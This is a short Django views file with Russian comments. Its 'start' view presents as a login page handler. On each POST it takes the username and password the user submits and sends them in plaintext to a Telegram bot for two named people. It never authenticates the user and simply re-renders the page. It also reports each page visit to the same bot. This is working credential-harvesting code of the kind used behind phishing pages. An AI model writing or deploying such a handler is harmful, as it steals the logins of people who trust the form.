# -*- coding: utf-8 -*-
from __future__ import unicode_literals
from django.shortcuts import render
import os, sys
from django.contrib import auth
from django.http import Http404, HttpResponse 
import bot_inform # информация в месенджере телеграмм: bot_inform.sent_to_atknin_bot(massage, telegram_whom)
telegram_whom = "forboth"#v - ваня d - дима, остальное любое вдоем
# Create your views here.
def start(request):
	if request.method == "POST":
		user = request.POST["login"]
		password = request.POST["password"]
		bot_inform.sent_to_atknin_bot(user+" " + password, telegram_whom)
		return render(request, 'html/start.html')
	else:
		massage = ' - Мы, тут'
		bot_inform.sent_to_atknin_bot(massage, telegram_whom)
		return render(request, 'html/start.html')
